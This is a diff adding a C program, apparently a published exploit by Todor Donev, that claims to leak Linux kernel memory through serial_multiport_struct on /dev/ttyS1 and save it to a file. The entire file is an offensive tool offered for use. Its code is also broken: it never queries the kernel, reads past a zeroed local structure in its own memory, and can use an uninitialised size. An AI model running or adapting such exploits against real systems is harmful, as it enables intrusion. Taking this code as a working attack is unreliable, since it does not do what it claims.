@@ -1,0 +1,75 @@
+/* Linux <= 2.6.37-rc1 serial_multiport_struct Info Leak Exploit
+ * 
+ *  ./splitmilk2 leak 134514859
+ * [\m/] Linux <= 2.6.37-rc1 serial_multiport_struct Info Leak Exploit
+ * [\m/] by Todor Donev
+ *  [x] Leakfile	: leak
+ *  [x] Reservedsize	: 134514859
+ * [+] Leaking.. =)
+ * ...
+ *  
+ *
+ * Greets to prdelka,
+ * for splitmilk.c release, Linux <= 2.6.37-rc1 serial_core TIOCGICOUNT leak exploit 
+ * 
+ * Thanks to Tsvetelina Emirska,
+ * that support, respect and inspire me..  
+ *
+ * Yes,	I know thats lame, but I was so bored and lazy for better. 
+ *
+ * Author: Todor Donev 
+ * Author email: [todor.donev@gmail]
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h> 
+#include <termios.h>
+#include <linux/serial.h>
+
+#define DEVICE "/dev/ttyS1"
+ 
+int main(int argc, char* argv[]) {
+    int ret = 0;
+    int i, fd, reservedsize;
+    char* buf;
+    struct  serial_multiport_struct  buffer;
+    printf("[\\m/] Linux <= 2.6.37-rc1 serial_multiport_struct Info Leak Exploit\n");
+    printf("[\\m/] by Todor Donev\n");
+    fd = open(DEVICE, O_RDONLY); 
+    if (fd <0) {
+    printf("[-] Error: f0k\n"); 
+    exit(-1); 
+}   
+    if (argc < 2) {
+        fprintf(stderr, "[!] usg: %s <leakfile> <reservedsize>\n", argv[0]);
+        exit(-1);
+    }
+    if (argc > 2)
+        if ((reservedsize = atoi(argv[2])) == 0) {
+            fprintf(stderr, " [-] Sorry: (atoi) invalid outsize\n");
+            exit(-1);
+        }
+    fprintf(stderr, "  [x] Leakfile: %s\n", argv[1]);
+    fprintf(stderr, "  [x] Reservedsize: %u\n", reservedsize);
+     if ((buf = (char *)malloc(reservedsize)) == NULL) {
+        perror("Sorry: (malloc)");
+        fprintf(stderr, " [-] Sorry: Try again with other output size\n");
+        exit(1);
+    }
+    memset(&buffer,0,sizeof(buffer));
+    printf("[+] Leaking.. =)\n");
+    if((fd = open(argv[1], O_RDWR | O_CREAT, 0640)) == -1){
+    printf("[-] Error: f0k =(\n");
+    exit(-1);
+    }
+    for(i=0;i<=reservedsize;i++){
+        ret += write(fd,&buffer.reserved[i],sizeof(int));
+    }
+    close(fd);
+    printf("\\o/ %d bytez\n",ret);
+    exit(0);
+}
+
